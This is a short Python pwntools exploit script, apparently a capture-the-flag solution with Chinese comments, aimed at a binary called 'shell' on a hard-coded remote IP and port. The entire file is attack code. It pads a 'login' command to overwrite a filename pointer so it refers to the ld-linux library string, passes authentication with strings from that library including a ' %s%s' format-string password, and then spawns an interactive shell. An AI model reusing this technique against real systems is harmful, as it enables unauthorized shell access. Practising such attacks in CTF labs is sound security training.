from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/shell')

# p = process('../file/shell')
p = remote('61.147.171.105', '54308')

pause()

# 将filename覆盖为0x400200，指向字符串'/lib64/ld-linux-x86-64.so.2'
p.sendlineafter(b'$ ', b'login'.ljust(0x24, b'\0') + p64(0x400200))

# 只要输入ld文件中存在的用户名密码就可以通过认证，寻找程序参考search.c

# 远程
p.sendlineafter(b'Username: ', b'relocation processing')
p.sendlineafter(b'Password: ', b' %s%s')

# 本地
# p.sendlineafter(b'Username: ', b'prelink checking')
# p.sendlineafter(b'Password: ', b' %s')

p.sendlineafter(b'# ', b'sh')
p.interactive()